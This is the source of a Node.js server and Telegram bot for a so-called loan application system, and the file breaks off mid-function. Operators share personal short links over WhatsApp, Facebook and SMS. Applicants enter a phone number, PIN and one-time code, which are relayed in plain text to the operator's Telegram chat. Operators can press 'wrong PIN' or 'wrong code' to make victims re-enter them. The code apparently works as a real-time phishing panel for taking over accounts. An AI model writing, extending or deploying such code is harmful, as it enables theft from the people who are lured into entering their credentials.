const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `https://final-8xfd.onrender.com`;

const bot = new TelegramBot(BOT_TOKEN);

const adminChatIds = new Map();
const pausedAdmins = new Set();
const processingLocks = new Set();

let dbReady = false;

// ==========================================
// ✅ SHORT CODE GENERATOR
// ==========================================
async function generateUniqueShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (let attempt = 0; attempt < 20; attempt++) {
        let code = '';
        for (let i = 0; i < 5; i++) {
            code += chars[Math.floor(Math.random() * chars.length)];
        }
        const existing = await db.getAdminByShortCode(code);
        if (!existing) return code;
    }
    throw new Error('Could not generate unique short code after 20 attempts');
}

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) { console.error(`❌ No chat ID for admin: ${adminId}`); return null; }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT SETUP
// ==========================================
bot.on('error', (e) => console.error('❌ Bot error:', e?.message));
bot.on('polling_error', (e) => console.error('❌ Polling error:', e?.message));

setupCommandHandlers();

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        if (req.body?.update_id !== undefined) {
            try { bot.processUpdate(req.body); } catch (e) { console.error('❌ processUpdate error:', e); }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSet = false;

        for (let attempt = 1; attempt <= 3 && !webhookSet; attempt++) {
            try {
                console.log(`🔄 Attempt ${attempt}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(r => setTimeout(r, 1000));
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false, max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) { webhookSet = true; console.log('✅ Webhook confirmed!'); }
                }
            } catch (e) {
                console.error(`❌ Webhook attempt ${attempt} failed:`, e.message);
                if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!webhookSet) console.error('❌ CRITICAL: Failed to set webhook!');

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot: @${botInfo.username}`);
        } catch (e) { console.error('❌ Bot API error:', e); }

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins, ${pausedAdmins.size} paused`);
        }, 60000);

        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                if (info.url !== fullWebhookUrl) {
                    console.log('⚠️ Webhook lost — re-setting...');
                    await bot.setWebHook(fullWebhookUrl, { drop_pending_updates: false, max_connections: 40, allowed_updates: ['message', 'callback_query'] });
                }
            } catch (e) { console.error('⚠️ Webhook check error:', e.message); }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => { console.error('❌ Initialization failed:', error); process.exit(1); });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();
        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================

function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            let adminId = getAdminIdByChatId(chatId);

            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nContact the super admin.\n\n*Your Admin ID:* \`${adminId}\``, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                if (admin) {
                    const isSuperAdmin = adminId === 'ADMIN001';
                    const appUrl = process.env.APP_URL || WEBHOOK_URL;
                    const shortLink = admin.shortCode ? `${appUrl}/${admin.shortCode}` : 'Not set';

                    let message = `👋 *Welcome ${admin.name}!*\n\n*Admin ID:* \`${adminId}\`\n*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}\n*Your Short Link:*\n\`${shortLink}\`\n\n*Commands:*\n/mylink - Your short link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information\n`;

                    if (isSuperAdmin) {
                        message += `\n*Super Admin Commands:*\n/addadmin - Add new admin\n/admins - List all admins\n/pauseadmin <adminId> - Pause admin\n/unpauseadmin <adminId> - Unpause admin\n/removeadmin <adminId> - Remove admin\n/send <adminId> <msg> - Message admin\n/broadcast <msg> - Message all admins\n/fixlinks - Assign short codes to existing admins\n`;
                    }
                    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
                }
            } else {
                await bot.sendMessage(chatId, `👋 *Welcome!*\n\nYour Chat ID: \`${chatId}\`\n\nProvide this to your super admin for access.`, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }

        const admin = await db.getAdmin(adminId);
        const appUrl = process.env.APP_URL || WEBHOOK_URL;
        const shortLink = admin?.shortCode ? `${appUrl}/${admin.shortCode}` : 'Short code not set — contact super admin';

        bot.sendMessage(chatId, `🔗 *YOUR SHORT LINK*\n\n\`${shortLink}\`\n\n✅ Share this link with your customers.\n📱 Works on Facebook, WhatsApp, SMS — everywhere!\n🚫 Users without this link cannot apply.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `📊 *YOUR STATISTICS*\n\n📋 Total: ${stats.total}\n⏳ PIN Pending: ${stats.pinPending}\n✅ PIN Approved: ${stats.pinApproved}\n⏳ OTP Pending: ${stats.otpPending}\n🎉 Fully Approved: ${stats.fullyApproved}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) { message += `📱 *PIN (${pinPending.length}):*\n`; pinPending.forEach((app, i) => { message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`; }); message += '\n'; }
        if (otpPending.length > 0) { message += `🔢 *OTP (${otpPending.length}):*\n`; otpPending.forEach((app, i) => { message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`; }); }
        if (pinPending.length === 0 && otpPending.length === 0) message = '✨ No pending applications!';

        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }

        const admin = await db.getAdmin(adminId);
        const appUrl = process.env.APP_URL || WEBHOOK_URL;
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText = pausedAdmins.has(adminId) ? 'Paused' : 'Active';

        bot.sendMessage(chatId, `ℹ️ *YOUR INFO*\n\n👤 ${admin.name}\n📧 ${admin.email}\n🆔 \`${adminId}\`\n💬 \`${chatId}\`\n🔑 Short Code: \`${admin.shortCode || 'None'}\`\n📅 ${new Date(admin.createdAt).toLocaleString()}\n${statusEmoji} Status: ${statusText}\n\n🔗 Your link:\n${admin.shortCode ? `${appUrl}/${admin.shortCode}` : 'No short code'}`, { parse_mode: 'Markdown' });
    });

    // ✅ Add admin — now generates short code automatically
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can add admins.'); return; }

        await bot.sendMessage(chatId, `📝 *ADD NEW ADMIN*\n\nFormat:\n\`/addadmin NAME|EMAIL|CHATID\`\n\n*Example:*\n\`/addadmin John Doe|john@example.com|123456789\`\n\n✅ A unique short link will be auto-generated.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can add admins.'); return; }

        try {
            const input = match[1].trim();
            const parts = input.split('|').map(p => p.trim());
            if (parts.length !== 3) { await bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' }); return; }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) { await bot.sendMessage(chatId, '❌ Chat ID must be a number!'); return; }

            // Auto-generate admin ID
            const allAdmins = await db.getAllAdmins();
            const existingNumbers = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            // ✅ Auto-generate short code
            const shortCode = await generateUniqueShortCode();
            const appUrl = process.env.APP_URL || WEBHOOK_URL;

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, shortCode, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `✅ *ADMIN ADDED*\n\n👤 ${name}\n📧 ${email}\n🆔 \`${newAdminId}\`\n💬 \`${newChatId}\`\n🔑 Short Code: \`${shortCode}\`\n\n🔗 *Their Short Link:*\n\`${appUrl}/${shortCode}\`\n\n✅ Admin is ready to receive applications!\n🚫 Only users with this link can apply through them.`, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `🎉 *YOU'RE NOW AN ADMIN!*\n\nWelcome ${name}!\n\n*Your Admin ID:* \`${newAdminId}\`\n*Your Short Code:* \`${shortCode}\`\n*Your Short Link:*\n\`${appUrl}/${shortCode}\`\n\n📢 Share this link with your customers.\n✅ Only people with your link can submit applications to you.\n\n*Commands:*\n/mylink - Your short link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information`, { parse_mode: 'Markdown' });
            } catch (e) {
                await bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    // Transfer admin
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can transfer admin access.'); return; }

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) { await bot.sendMessage(chatId, '❌ Use: /transferadmin oldChatId | newChatId'); return; }

            const oldChatId = parseInt(parts[0]);
            const newChatId = parseInt(parts[1]);
            if (isNaN(oldChatId) || isNaN(newChatId)) { await bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!'); return; }

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) { await bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' }); return; }
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot transfer the super admin!'); return; }

            const admin = await db.getAdmin(targetAdminId);
            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `🔄 *ADMIN TRANSFERRED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\nOld Chat: \`${oldChatId}\` → New Chat: \`${newChatId}\``, { parse_mode: 'Markdown' });
            bot.sendMessage(oldChatId, `⚠️ Your admin access has been transferred to a new device. Contact super admin if this was not you.`).catch(() => {});
            bot.sendMessage(newChatId, `🎉 Admin access transferred to you!\n\n*Admin ID:* \`${targetAdminId}\`\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {
                bot.sendMessage(chatId, `⚠️ New Chat ID needs to /start the bot.`);
            });
        } catch (error) {
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // Pause admin
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can pause admins.'); return; }

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot pause the super admin!'); return; }

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            if (pausedAdmins.has(targetAdminId)) { await bot.sendMessage(chatId, `⚠️ Admin is already paused.`); return; }

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            await bot.sendMessage(chatId, `🚫 *ADMIN PAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n\n🔗 Their link is now DEAD — users will see the blocked page.\nUse /unpauseadmin ${targetAdminId} to restore.`, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `🚫 Your admin access has been paused. Contact super admin.`).catch(() => {});
        } catch (error) {
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // Unpause admin
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.'); return; }

        try {
            const targetAdminId = match[1].trim();
            if (!pausedAdmins.has(targetAdminId)) { await bot.sendMessage(chatId, `⚠️ Admin is not paused.`); return; }

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }

            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            await bot.sendMessage(chatId, `✅ *ADMIN UNPAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n\n🔗 Their short link is now ACTIVE again.`, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `✅ Your admin access has been restored. Use /start to see your commands.`).catch(() => {});
        } catch (error) {
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // Remove admin
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can remove admins.'); return; }

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot remove the super admin!'); return; }

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);

            await bot.sendMessage(chatId, `🗑️ *ADMIN REMOVED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n\n🔗 Their short link \`/${admin.shortCode}\` is now permanently dead.`, { parse_mode: 'Markdown' });
            if (admin.chatId) bot.sendMessage(admin.chatId, `🗑️ Your admin access has been removed. Contact super admin if you have questions.`).catch(() => {});
        } catch (error) {
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // List all admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }

        try {
            const allAdmins = await db.getAllAdmins();
            const appUrl = process.env.APP_URL || WEBHOOK_URL;
            const MAX_LENGTH = 3500;
            const chunks = [];
            let current = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdmin = admin.adminId === 'ADMIN001';
                const isPaused = pausedAdmins.has(admin.adminId);
                let statusEmoji = isSuperAdmin ? '⭐' : (isPaused ? '🚫' : '✅');
                let statusText = isSuperAdmin ? 'Super Admin' : (isPaused ? 'Paused' : 'Active');
                const shortLink = admin.shortCode ? `${appUrl}/${admin.shortCode}` : 'No link';

                const entry = `${index + 1}. ${statusEmoji} *${admin.name}*\n` +
                    `   📧 ${admin.email}\n` +
                    `   🆔 \`${admin.adminId}\`\n` +
                    `   🔗 \`${shortLink}\`\n` +
                    `   ${statusText}\n\n`;

                if ((current + entry).length > MAX_LENGTH) { chunks.push(current); current = entry; }
                else current += entry;
            });
            chunks.push(current);
            for (const chunk of chunks) await bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    // Send message to specific admin
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can send messages.'); return; }

        const input = match[1].trim();
        const spaceIndex = input.indexOf(' ');
        if (spaceIndex === -1) { await bot.sendMessage(chatId, '❌ Use: /send ADMINID Your message here'); return; }

        const targetAdminId = input.substring(0, spaceIndex).trim();
        const messageText = input.substring(spaceIndex + 1).trim();
        const targetAdmin = await db.getAdmin(targetAdminId);
        if (!targetAdmin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }

        const sent = await sendToAdmin(targetAdminId, `📨 *MESSAGE FROM SUPER ADMIN*\n\n${messageText}\n\n---\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
        if (sent) await bot.sendMessage(chatId, `✅ Message sent to ${targetAdmin.name}`);
        else await bot.sendMessage(chatId, `❌ Failed to send to ${targetAdmin.name} — they may need to /start the bot`);
    });

    // Broadcast
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can broadcast.'); return; }

        const messageText = match[1].trim();
        const allAdmins = await db.getAllAdmins();
        const targets = allAdmins.filter(a => a.adminId !== 'ADMIN001');
        let success = 0, fail = 0;

        for (const admin of targets) {
            const sent = await sendToAdmin(admin.adminId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${messageText}\n\n---\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
            if (sent) success++; else fail++;
            await new Promise(r => setTimeout(r, 100));
        }
        await bot.sendMessage(chatId, `📢 *BROADCAST DONE*\n\n✅ Sent: ${success}\n❌ Failed: ${fail}\nTotal: ${targets.length}`, { parse_mode: 'Markdown' });
    });

    // Fix missing short codes for existing admins
    bot.onText(/\/fixlinks/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only superadmin can run this.');
            return;
        }

        try {
            const allAdmins = await db.getAllAdmins();
            const noCode = allAdmins.filter(a => !a.shortCode);

            if (noCode.length === 0) {
                await bot.sendMessage(chatId, '✅ All admins already have short codes!');
                return;
            }

            await bot.sendMessage(chatId, `🔄 Found ${noCode.length} admin(s) without short codes. Generating...`);

            const appUrl = process.env.APP_URL || WEBHOOK_URL;
            let report = `✅ *SHORT CODES ASSIGNED*\n\n`;

            for (const admin of noCode) {
                const shortCode = await generateUniqueShortCode();
                await db.updateAdmin(admin.adminId, { shortCode });

                report += `👤 ${admin.name}\n🆔 \`${admin.adminId}\`\n🔗 \`${appUrl}/${shortCode}\`\n\n`;

                // Notify the admin
                try {
                    await bot.sendMessage(admin.chatId,
                        `🔗 *YOUR SHORT LINK IS READY*\n\n\`${appUrl}/${shortCode}\`\n\n✅ Share this with your customers.\n📱 Works on WhatsApp, Facebook, SMS!`,
                        { parse_mode: 'Markdown' }
                    );
                } catch (e) {
                    report += `⚠️ Could not notify ${admin.name}\n\n`;
                }
            }

            await bot.sendMessage(chatId, report, { parse_mode: 'Markdown' });

        } catch (error) {
            await bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers ready!');
}

// ==========================================
// CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);

    if (!adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        return;
    }
    if (!isAdminActive(chatId)) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
        return;
    }

    const parts = data.split('_');
    if (parts.length < 4) { await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid data.', show_alert: true }); return; }

    const action = parts[0];
    const type = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
        return;
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
        return;
    }

    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`❌ *WRONG PIN AT OTP STAGE*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\n⚠️ User will re-enter PIN.\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN', show_alert: false });
    } else if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`❌ *WRONG CODE*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${application.otp}\`\n\n⚠️ User will re-enter code.\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code', show_alert: false });
    } else if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *REJECTED*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔑 \`${application.pin}\`\n\n✗ REJECTED\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected', show_alert: false });
    } else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *APPROVED — OTP STAGE*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔑 \`${application.pin}\`\n\n✓ APPROVED\n⏰ ${new Date().toLocaleString()}\n\nUser will now enter OTP.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP.', show_alert: false });
    } else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN APPROVED!*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\n✓ FULLY APPROVED\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!', show_alert: false });
    }
});

// ==========================================
// DB READY CHECK MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// API ENDPOINTS
// ==========================================

// ✅ STRICT: No auto-assign — adminId is required
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId } = req.body;

        // ✅ BLOCK: Reject if no adminId provided
        if (!requestAdminId || requestAdminId === 'null' || requestAdminId === 'undefined' || requestAdminId === '') {
            console.warn('🚫 Rejected /api/verify-pin — no adminId in request');
            return res.status(403).json({ success: false, message: 'Invalid access. Please use your personal link from your loan officer.' });
        }

        const applicationId = `APP-${Date.now()}`;

        const lockKey = `pin_${phoneNumber}`;
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);
        setTimeout(() => processingLocks.delete(lockKey), 10000);

        // Validate admin
        const assignedAdmin = await db.getAdmin(requestAdminId);

        if (!assignedAdmin) {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'Invalid link. Admin not found.' });
        }
        if (assignedAdmin.status !== 'active') {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'This link is no longer active. Contact your loan officer.' });
        }
        if (pausedAdmins.has(requestAdminId)) {
            processingLocks.delete(lockKey);
            return res.status(400).json({ success: false, message: 'This admin is currently unavailable. Contact your loan officer.' });
        }

        // Duplicate prevention
        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            processingLocks.delete(lockKey);
            return res.json({ success: true, applicationId: alreadyPending.id, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
        }

        // Returning user check
        const pastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const isReturningUser = pastApps.length > 0;
        let historyText = '';
        if (isReturningUser) {
            const last = pastApps[0];
            const lastDate = new Date(last.timestamp).toLocaleString();
            const lastStatus = last.otpStatus === 'approved' ? '✅ Approved' : last.pinStatus === 'rejected' ? '❌ Rejected' : '⏳ Incomplete';
            historyText = `\n📊 *Returning user: ${pastApps.length} previous app(s)*\nLast: ${lastDate} — ${lastStatus}`;
        }

        // Ensure admin is in active map
        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
            } else {
                processingLocks.delete(lockKey);
                return res.status(503).json({ success: false, message: 'Admin not connected — they need to send /start to the bot first.' });
            }
